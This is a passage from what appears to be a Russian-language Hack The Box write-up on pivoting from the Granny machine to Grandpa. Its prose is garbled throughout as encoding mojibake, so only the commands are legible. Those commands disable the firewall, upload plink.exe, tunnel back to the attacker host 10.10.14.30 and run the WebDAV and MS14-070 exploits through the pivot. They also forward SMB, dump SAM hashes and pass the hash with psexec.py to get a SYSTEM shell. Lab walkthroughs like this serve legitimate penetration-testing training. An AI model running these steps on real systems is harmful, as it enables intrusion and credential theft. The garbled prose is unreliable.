–ø–æ–ª—É—á–∏–ª–æ—Å—å —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å: `portfwd` –æ—Ç–∫–∞–∑—ã–≤–∞–ª—Å—è —Å–æ–∑–¥–∞–≤–∞—Ç—å —Ä–µ–ª–µ–π, —Ä—É–≥–∞—è—Å—å –∏–º–µ–Ω–Ω–æ –Ω–∞ —Ñ–ª–∞–≥ `-R`.

–ï—Å–ª–∏ –±—ã –Ω–∞ –í–ú Granny –±—ã–ª —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω PowerShell, –ª—É—á—à–∏–º —Ä–µ—à–µ–Ω–∏–µ–º –±—ã–ª–æ –±—ã [—Ä–∞–∑–≤–µ—Ä–Ω—É—Ç—å](https://habr.com/ru/post/453676/) SSH-—Å–µ—Ä–≤–µ—Ä –∏–º–µ–Ω–Ω–æ —Ç–∞–º –∏ –ø–æ–¥–∫–ª—é—á–∞—Ç—å—Å—è –∫ SSH —Å –∫–ª–∏–µ–Ω—Ç–∞ Kali, —É–∫–∞–∑—ã–≤–∞—è –ø—Ä–∏ —ç—Ç–æ–º –æ–ø—Ü–∏—é `-R` (SSH Reverse Tunneling). –ù–æ, –∫ —Å–æ–∂–∞–ª–µ–Ω–∏—é, PS –Ω–∞ –ø—Ä–æ–º–µ–∂—É—Ç–æ—á–Ω–æ–º —Ö–æ—Å—Ç–µ –Ω–µ –æ–∫–∞–∑–∞–ª–æ—Å—å, –ø–æ—ç—Ç–æ–º—É –≤ —Ä–æ–ª–∏ —Å–µ—Ä–≤–µ—Ä–∞ –≤—ã–Ω—É–∂–¥–µ–Ω–∞ –±—ã–ª–∞ –≤—ã—Å—Ç—É–ø–∏—Ç—å –º–∞—à–∏–Ω–∞ –∞—Ç–∞–∫—É—é—â–µ–≥–æ.

### –û—Ç–∫–ª—é—á–∞–µ–º —Ñ–∞–π—Ä–≤–æ–ª

–ß—Ç–æ–±—ã –ø—Ä–æ–±—Ä–æ—Å–∏—Ç—å SSH-—Ç—É–Ω–Ω–µ–ª—å c Granny –¥–æ Kali, —Å–ø–µ—Ä–≤–∞ –ø—Ä–∏–¥–µ—Ç—Å—è –æ—Ç–∫–ª—é—á–∏—Ç—å —Ñ–∞–π—Ä–≤–æ–ª –Ω–∞ Windows Server. –°–¥–µ–ª–∞—Ç—å —ç—Ç–æ –º–æ–∂–Ω–æ —Ç–æ–ª—å–∫–æ —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ –∞–¥–º–∏–Ω–∞, –ø–æ—ç—Ç–æ–º—É –º–Ω–µ –ø—Ä–∏—à–ª–æ—Å—å —Å–Ω–æ–≤–∞ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è MS14-070.

![msf-pivot-granny-privesc.png]({{ "/img/htb/boxes/grandparents/msf-pivot-granny-privesc.png" | relative_url }})
{: .center-image}

–¢–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ —Å–ø–∞–≤–Ω–∏—Ç—å —à–µ–ª–ª –∏ –¥–µ–ª–∞—Ç—å –≤—Å–µ, —á—Ç–æ –¥—É—à–µ —É–≥–æ–¥–Ω–æ.

```
C:\WINDOWS\system32>netsh firewall set opmode disable
netsh firewall set opmode disable
Ok.
```

### PuTTY –∏–∑ –∫–æ–Ω—Å–æ–ª–∏

–°–æ–∑–¥–∞–≤–∞—Ç—å —Ç—É–Ω–Ω–µ–ª—å –±—É–¥–µ–º —Å –ø–æ–º–æ—â—å—é –∫–æ–Ω—Å–æ–ª—å–Ω–æ–≥–æ SSH-–∫–ª–∏–µ–Ω—Ç–∞ –¥–ª—è Windows ‚Äî Plink (–∞–Ω–∞–ª–æ–≥ PuTTY –¥–ª—è –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏). –ï–≥–æ –º–æ–∂–Ω–æ [—Å–∫–∞—á–∞—Ç—å](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –Ω–∞–π—Ç–∏ –≤ Kali, –≤ —Ä–∞–∑–¥–µ–ª–µ –≥–æ—Ç–æ–≤—ã—Ö –±–∏–Ω–∞—Ä–µ–π –¥–ª—è –≤–∏–Ω–¥—ã.

```
root@kali:~# locate plink.exe
/usr/share/windows-resources/binaries/plink.exe
```

–ó–∞–±—Ä–æ—Å–∏–º Plink –Ω–∞ Windows Server —Å –ø–æ–º–æ—â—å—é meterpreter. –Ø –≤—ã–±—Ä–∞–ª –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é, –∫–æ—Ç–æ—Ä–∞—è –∞–ø—Ä–∏–æ—Ä–∏ –¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è –∑–∞–ø–∏—Å–∏ ‚Äî `C:\Inetpub\wwwroot`.

```
meterpreter > upload plink.exe "c:\inetpub\wwwroot"
[*] uploading  : plink.exe -> c:\inetpub\wwwroot
[*] uploaded   : plink.exe -> c:\inetpub\wwwroot\plink.exe
```

–¢–µ–ø–µ—Ä—å —Å–æ–∑–¥–∞–¥–∏–º –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è `snovvcrash` –Ω–∞ —Å–≤–æ–µ–π –º–∞—à–∏–Ω–µ (—á—Ç–æ–±—ã –Ω–µ –ø–æ–¥–Ω–∏–º–∞—Ç—å —Ç—É–Ω–Ω–µ–ª—å –æ—Ç –∏–º–µ–Ω–∏ root), –∑–∞–¥–∞–¥–∏–º –¥–ª—è –Ω–µ–≥–æ –ø–∞—Ä–æ–ª—å `qwe123` –∏ —Å—Ç–∞—Ä—Ç—É–µ–º SSH-—Å–µ—Ä–≤–µ—Ä.

```
root@kali:~# useradd snovvcrash
root@kali:~# passwd snovvcrash
New password: qwe123
Retype new password: qwe123
passwd: password updated successfully
root@kali:~# service ssh start
```

–ï—â–µ —è –ª–∏—à—É —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–º–∞–Ω–¥—ã, –∏–∑–º–µ–Ω–∏–≤ –¥–µ—Ñ–æ–ª—Ç–Ω—ã–π —à–µ–ª–ª –Ω–∞ `/bin/false` –≤ —Ñ–∞–π–ª–µ `/etc/passwd`. –í—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–º–∞–Ω–¥—ã –µ–º—É –Ω–µ –∑–∞ —á–µ–º, –∞ –≤–æ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å —Å—Ö–µ–º—ã –æ—Ç —ç—Ç–æ–≥–æ —Ç–æ–ª—å–∫–æ –ø–æ–≤—ã—Å–∏—Ç—Å—è.

![etc-passwd-edit.png]({{ "/img/htb/boxes/grandparents/etc-passwd-edit.png" | relative_url }})
{: .center-image}

–¢–µ–ø–µ—Ä—å –≤—Å–µ –≥–æ—Ç–æ–≤–æ –∏ –º–æ–∂–Ω–æ –ø—Ä–æ–∫–ª–∞–¥—ã–≤–∞—Ç—å SSH-—Ç—É–Ω–Ω–µ–ª—å. –ò–∑ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ Windows —è –≤—ã–ø–æ–ª–Ω—é —Ç–∞–∫—É—é –∫–æ–º–∞–Ω–¥—É.

```
C:\Inetpub\wwwroot>plink.exe -l snovvcrash -pw qwe123 -L 10.10.10.15:8888:10.10.14.30:8888 -N 10.10.14.30
```

![ssh-tunnel-create.png]({{ "/img/htb/boxes/grandparents/ssh-tunnel-create.png" | relative_url }})
{: .center-image}

–≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç –ø—Ä–∏–º–µ—Ä–Ω–æ —Å–ª–µ–¥—É—é—â–µ–µ: ¬´Granny, –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–π, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—Å–µ, —á—Ç–æ –ø–æ—Å—Ç—É–ø–∏—Ç –≤ –ø–æ—Ä—Ç `8888` –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ `10.10.10.15` –ø–æ –∞–¥—Ä–µ—Å—É `10.10.14.30:8888` —á–µ—Ä–µ–∑ SSH-—Ç—É–Ω–Ω–µ–ª—å¬ª. –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ä–∞–±–æ—Ç–æ—Å–ø–æ—Å–æ–±–Ω–æ—Å—Ç—å –º–æ–∂–Ω–æ —Å –ø–æ–º–æ—â—å—é –æ–±—ã—á–Ω–æ–≥–æ `nc`.

![ssh-tunnel-check.png]({{ "/img/htb/boxes/grandparents/ssh-tunnel-check.png" | relative_url }})
{: .center-image}

–û–±—Ä–∞—â–∞—é –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ–±—ã –Ω–µ –≤–æ–∑–Ω–∏–∫–ª–æ –ø—É—Ç–∞–Ω–∏—Ü—ã: —Ç—É–Ω–Ω–µ–ª—å –±—ã–ª —Å–æ–∑–¥–∞–Ω —Å –æ–ø—Ü–∏–µ–π `-L` —Å —Ö–æ—Å—Ç–∞ Granny, –ø–æ—ç—Ç–æ–º—É –ø–æ –æ—Ç–Ω–æ—à–µ–Ω–∏—é –∫ –º–∞—à–∏–Ω–µ –∞—Ç–∞–∫—É—é—â–µ–≥–æ –æ–Ω —è–≤–ª—è–µ—Ç—Å—è ¬´–ø—Ä—è–º—ã–º¬ª. –ï—Å–ª–∏ –∂–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –Ω–∞ —ç—Ç—É —Å—Ö–µ–º—É —Å–æ —Å—Ç–æ—Ä–æ–Ω—ã Kali, —Ç–æ —Ç—É–Ω–Ω–µ–ª—å –ª–æ–≥–∏—á–Ω–µ–µ –Ω–∞–∑—ã–≤–∞—Ç—å ¬´—Ä–µ–≤–µ—Ä—Å–∏–≤–Ω—ã–º¬ª.

–¢–µ–ø–µ—Ä—å –Ω–∞—à–∞ —Å—Ö–µ–º–∞ –≤—ã–≥–ª—è–¥–∏—Ç —Ç–∞–∫.

![network-pivot-ssh-tunnel.png]({{ "/img/htb/boxes/grandparents/network-pivot-ssh-tunnel.png" | relative_url }})
{: .center-image}

### Hack Grandpa!

–í—Å–µ –≥–æ—Ç–æ–≤–æ, –∏ –º–æ–∂–Ω–æ (–≤–æ –≤—Ç–æ—Ä–æ–π —Ä–∞–∑) —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º—É Grandpa.

–î–ª—è —ç—Ç–æ–≥–æ —è –æ–ø—è—Ç—å –≤—ã–±–µ—Ä—É —ç–∫—Å–ø–ª–æ–∏—Ç `iis_webdav_scstoragepathfromurl`, –Ω–æ –≤ —ç—Ç–æ—Ç —Ä–∞–∑ –µ–≥–æ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –±—É–¥–µ—Ç –Ω–µ–º–Ω–æ–≥–æ –æ—Ç–ª–∏—á–∞—Ç—å—Å—è: –Ω–∞ —Ä–æ–ª—å –º–∞—à–∏–Ω—ã –∞—Ç–∞–∫—É—é—â–µ–≥–æ (`LHOST`) —è –Ω–∞–∑–Ω–∞—á—É —Ö–æ—Å—Ç Granny (`10.10.10.15`), –∞ –≤ —Ä–æ–ª–∏ –ø–æ—Ä—Ç–∞ –¥–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ —Ö–µ–Ω–¥–ª–µ—Ä–∞ (`LPORT`) –≤—ã—Å—Ç—É–ø–∏—Ç –ø–æ—Ä—Ç `8888` (—á–µ—Ä–µ–∑ –∫–æ—Ç–æ—Ä—ã–π –≤—Å–µ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å—Å—è –Ω–∞ Kali –ø–æ SSH-—Ç—É–Ω–Ω–µ–ª—é).

![msf-pivot-grandpa-scstoragepathfromurl.png]({{ "/img/htb/boxes/grandparents/msf-pivot-grandpa-scstoragepathfromurl.png" | relative_url }})
{: .center-image}

–ü–æ—Å–ª–µ –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —è –ø–æ–≤—ã—à—É –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ —Å –ø–æ–º–æ—â—å—é –Ω–µ –ø–æ–¥–≤–æ–¥–∏–≤—à–µ–≥–æ –µ—â–µ –Ω–∞—Å MS14-070.

![msf-pivot-grandpa-privesc.png]({{ "/img/htb/boxes/grandparents/msf-pivot-grandpa-privesc.png" | relative_url }})
{: .center-image}

–ü–æ—Å–ª–µ –≤—Å–µ—Ö –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–π –º–æ–∂–Ω–æ –æ—Ç–∫—Ä—ã—Ç—å —Å–µ—Å—Å–∏—é meterpreter –∏ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ.

```
meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

–ú—ã –∑–∞—Ö–≤–∞—Ç–∏–ª–∏ –ø–æ–ª–Ω–æ–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ Grandpa, –Ω–µ –æ–±–º–µ–Ω—è–≤—à–∏—Å—å —Å –Ω–∏–º –Ω–∞–ø—Ä—è–º—É—é –Ω–∏ –æ–¥–Ω–∏–º –±–∏—Ç–æ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏. –£—Ä–∞, –∑–∞–¥–∞—á–∞ —Ä–µ—à–µ–Ω–∞!

## –ü—Ä–æ–±—Ä–æ—Å –ø–æ—Ä—Ç–æ–≤ –¥–æ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Å–µ—Ä–≤–∏—Å–∞

–ù–∞ —Å–ª–∞–¥–∫–æ–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º –µ—â–µ –æ–¥–∏–Ω –∫–µ–π—Å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Ç—Ä–∞—Ñ–∏–∫–∞.

–§–∞–π—Ä–≤–æ–ª –Ω–∞ Grandpa –Ω–∏–∫—Ç–æ –Ω–µ –æ—Ç–∫–ª—é—á–∞–ª, –ø–æ—ç—Ç–æ–º—É –º—ã –Ω–µ –º–æ–∂–µ–º —Ç–∞–∫ –ø—Ä–æ—Å—Ç–æ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –µ–≥–æ SMB-—Ä–µ—Å—É—Ä—Å—É –∏–∑–≤–Ω–µ (–≤ —Å–ø–∏—Å–∫–µ –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤ Nmap –Ω–µ –±—ã–ª–æ 445-–≥–æ, –∫–∞–∫ —Ç—ã –ø–æ–º–Ω–∏—à—å). –û–¥–Ω–∞–∫–æ –≤–æ—Ç —á—Ç–æ –º—ã –º–æ–∂–µ–º —Å–¥–µ–ª–∞—Ç—å: —Å –ø–æ–º–æ—â—å—é meterpreter –ø—Ä–æ–±—Ä–æ—Å–∏—Ç—å —Å–≤–æ–π –ª–æ–∫–∞–ª—å–Ω—ã–π –ø–æ—Ä—Ç `445` —Å Kali –¥–æ –º–∞—à–∏–Ω—ã Grandpa, –≤—ã—Ç–∞—â–∏–≤ —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º —Å–µ—Ä–≤–∏—Å SMB –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –Ω–∞ –ø–æ–≤–µ—Ä—Ö–Ω–æ—Å—Ç—å.

```
meterpreter > portfwd add -l 445 -p 445 -r 127.0.0.1
[*] Local TCP relay created: :445 <-> 127.0.0.1:445
```

–≠—Ç–æ–π –∫–æ–º–∞–Ω–¥–æ–π —è –≥–æ–≤–æ—Ä—é, —á—Ç–æ –ª–æ–∫–∞–ª—å–Ω—ã–π –ø–æ—Ä—Ç `445` (—Ñ–ª–∞–≥ `-l`) –º–∞—à–∏–Ω—ã –∞—Ç–∞–∫—É—é—â–µ–≥–æ –¥–æ–ª–∂–µ–Ω –∞—Å—Å–æ—Ü–∏–∏—Ä–æ–≤–∞—Ç—å—Å—è —Å –æ—Ç–∫—Ä—ã—Ç–æ–π —Å–µ—Å—Å–∏–µ–π meterpreter, –∞ –≤—Å–µ, —á—Ç–æ –≤ –Ω–µ–≥–æ –ø–æ–ø–∞–¥–∞–µ—Ç, –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –ø–µ—Ä–µ–¥–∞–Ω–æ –Ω–∞ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø–æ—Ä—Ç `445` (—Ñ–ª–∞–≥ `-p`) –º–∞—à–∏–Ω—ã-–∂–µ—Ä—Ç–≤—ã (—Ñ–ª–∞–≥ `-r`) –ø–æ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É `127.0.0.1` (—Ç–∞–∫ –∫–∞–∫ SMB –¥–æ—Å—Ç—É–ø–µ–Ω –ª–æ–∫–∞–ª—å–Ω–æ –Ω–∞ Windows Server). –ï—Å–ª–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å Nmap –∏ –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å 445-–π –ø–æ—Ä—Ç (–∑–∞–º–µ—Ç—å, —É–∂–µ –Ω–∞ –ª–æ–∫–∞–ª—Ö–æ—Å—Ç–µ) ‚Äî –æ, —á—É–¥–æ, –æ–Ω –æ–∫–∞–∂–µ—Ç—Å—è –æ—Ç–∫—Ä—ã—Ç—ã–º!

![nmap-grandpa-smb.png]({{ "/img/htb/boxes/grandparents/nmap-grandpa-smb.png" | relative_url }})
{: .center-image}

–¢–æ –µ—Å—Ç—å –ø–æ–≤–µ—Ä—Ö —É–∂–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω–æ–≥–æ –≤ Metasploit –º–∞—Ä—à—Ä—É—Ç–∞ –º—ã –ø—Ä–æ–±—Ä–æ—Å–∏–ª–∏ –ø–æ—Ä—Ç `445` —Å –º–∞—à–∏–Ω—ã –∞—Ç–∞–∫—É—é—â–µ–≥–æ –¥–æ –ø–æ—Ä—Ç–∞ `445` –Ω–∞ –í–ú Grandpa, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–∂–¥–µ –±—ã–ª –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –Ω–∞ loopback-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–µ –∏–∑-–∑–∞ –ø—Ä–∞–≤–∏–ª —Ñ–∞–π—Ä–≤–æ–ª–∞. –í —á–µ—Å—Ç—å —ç—Ç–æ–≥–æ –∑–∞–≤–µ—Ä—à–∏–º –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –Ω–∞—à–µ–π —Å—Ö–µ–º—ã –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è, –¥–æ–±–∞–≤–∏–≤ –Ω–∞ –Ω–µ–µ –ø—Ä–æ–±—Ä–æ—Å 445-–≥–æ –ø–æ—Ä—Ç–∞.

![network-pivot-portfwd.png]({{ "/img/htb/boxes/grandparents/network-pivot-portfwd.png" | relative_url }})
{: .center-image}

### Pass-the-Hash

–¢–∞–∫ –∫–∞–∫ —ç—Ç–æ Windows Server 2003, —Ç–µ–±–µ –Ω–µ —Å–æ—Å—Ç–∞–≤–∏—Ç –±–æ–ª—å—à–æ–≥–æ —Ç—Ä—É–¥–∞ –≤—Å–∫—Ä—ã—Ç—å —à–∞—Ä—É SMB, –≤–µ–¥—å –∑–¥–µ—Å—å –≤—Å–µ –µ—â–µ –∞–∫—Ç—É–∞–ª—å–Ω—ã LM-—Ö–µ—à–∏ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–∞—Ä–æ–ª–µ–π. –ê –æ–Ω–∏ –ª–æ–º–∞—é—Ç—Å—è –Ω–∞ —Ä–∞–∑. –û–¥–Ω–∞–∫–æ —è –ø–æ–π–¥—É –ø–æ –µ—â–µ –±–æ–ª–µ–µ –ø—Ä–æ—Å—Ç–æ–º—É –ø—É—Ç–∏.

![msf-pivot-grandpa-hashdump.png]({{ "/img/htb/boxes/grandparents/msf-pivot-grandpa-hashdump.png" | relative_url }})
{: .center-image}

–ë–ª–∞–≥–æ–¥–∞—Ä—è `hashdump` —è –º–æ–≥—É —Å–¥–∞–º–ø–∏—Ç—å –ø–∞—Ä—É —Ö–µ—à–µ–π `LMHASH:NTHASH` –∏–∑ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö SAM –∏ –ø—Ä–æ–≤–µ—Å—Ç–∏ –∞—Ç–∞–∫—É Pass-the-Hash —Å –ø–æ–º–æ—â—å—é –≤–Ω–µ—à–Ω–µ–π —É—Ç–∏–ª–∏—Ç—ã `psexec.py`, –≤—Ö–æ–¥—è—â–µ–π –≤ —Å–æ—Å—Ç–∞–≤ —Ç—É–ª–∫–∏—Ç–∞ [Impacket](https://github.com/SecureAuthCorp/impacket).

```
root@kali:~# ./psexec.py -hashes '0a70918d669baeb307012642393148ab:34dec8a1db14cdde2a21967c3c997548' Administrator@127.0.0.1
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share C$
[*] Uploading file NNDHtRms.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service tWni on 127.0.0.1.....
[*] Starting service tWni.....
[!] Press help for extra shell commands
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
nt authority\system
```

–¢–µ–ø–µ—Ä—å, –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ, –≤—Å–µ.

–ü–æ–ª–µ–∑–Ω—ã–µ —Å—Å—ã–ª–∫–∏:

* [A Pivot Cheatsheet for Pentesters](https://nullsweep.com/pivot-cheatsheet-for-pentesters/)
* [Explore Hidden Networks With Double Pivoting](https://pentest.blog/explore-hidden-networks-with-double-pivoting/)
* [–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ ssh socks –ø—Ä–æ–∫—Å–∏ —Å–æ–≤–º–µ—Å—Ç–Ω–æ —Å MSF Reverse TCP Payloads](https://habr.com/ru/post/167893/)
